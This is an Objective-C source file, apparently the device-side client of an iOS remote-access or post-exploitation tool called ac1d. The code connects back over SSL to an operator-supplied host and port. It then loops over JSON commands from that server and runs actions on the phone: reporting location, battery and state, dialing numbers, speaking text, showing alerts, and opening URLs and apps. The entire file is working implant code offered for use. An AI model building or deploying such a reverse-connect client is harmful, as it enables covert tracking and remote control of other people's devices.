//
// MIT License
//
// Copyright (c) 2020 Ivan Nikolsky
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.
//

#import "ac1d.h"

NSArray *commands = [[NSArray alloc] initWithObjects: @"alert", @"battery", @"dial", @"dhome", @"getvol", @"home", @"location", @"player", @"say", @"setvol", @"state", @"openurl", @"openapp", nil];

int sockfd, newsockfd;
SSL_CTX *ssl_client_ctx;
SSL *client_ssl;
struct sockaddr_in serverAddress;

void DestroySSL() {
    ERR_free_strings();
    EVP_cleanup();
}

void ShutdownSSL() {
    SSL_shutdown(client_ssl);
    SSL_free(client_ssl);
}

void interactWithServer(NSString *remoteHost, int remotePort) {
    ac1d *ac1d_base = [[ac1d alloc] init];
    ac1d_base->client_ssl = client_ssl;
    
    char buffer[2048] = "";
    while (SSL_read(client_ssl, buffer, sizeof(buffer))) {
        NSData *jsonData = [[NSString stringWithFormat:@"%s", buffer] dataUsingEncoding:NSUTF8StringEncoding];
        NSMutableDictionary *jsonDict = [NSJSONSerialization JSONObjectWithData:jsonData options:0 error:NULL];
        NSString *cmd = [jsonDict objectForKey:@"cmd"];
        NSString *args = [jsonDict objectForKey:@"args"];
        ac1d_base->terminator = (char*)[[jsonDict objectForKey:@"term"] UTF8String];
        NSMutableArray *cmd_data = [NSMutableArray array];
        [cmd_data addObject:cmd];
        [cmd_data addObject:args];
        if ([commands containsObject:cmd]) [ac1d_base send_command:cmd_data];
        memset(buffer, '\0', 2048);
    }
}

void connectToServer(NSString *remoteHost, int remotePort) {
    SSL_load_error_strings();
    SSL_library_init();
    OpenSSL_add_all_algorithms();
    ssl_client_ctx = SSL_CTX_new(SSLv23_client_method());
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    serverAddress.sin_family = AF_INET;
    inet_aton(remoteHost, &serverAddress.sin_addr);
    serverAddress.sin_port = htons(remotePort);
    if (connect(sockfd, (struct sockaddr *)&serverAddress, sizeof(serverAddress)) < 0) {
        printf("error");
        return;
    }
    client_ssl = SSL_new(ssl_client_ctx);
    if(!client_ssl) {
        printf("error");
        return;
    }
    SSL_set_fd(client_ssl, sockfd);
    if(SSL_connect(client_ssl) != 1) {
        printf("error");
        return;
    }
    interactWithServer(remoteHost, remotePort);
}

int main(int argc, const char *argv[]) {
    @autoreleasepool {
        if (argc < 3) printf("Usage: ac1d <remote_host> <remote_port>\n");
        else {
            NSMutableArray *args = [NSMutableArray array];
            for (int i = 0; i < argc; i++) {
                NSString *str = [[NSString alloc] initWithCString:argv[i] encoding:NSUTF8StringEncoding];
                [args addObject:str];
            }
            connectToServer(args[1], [args[2] integerValue]);
        }
    }
    return 0;
}
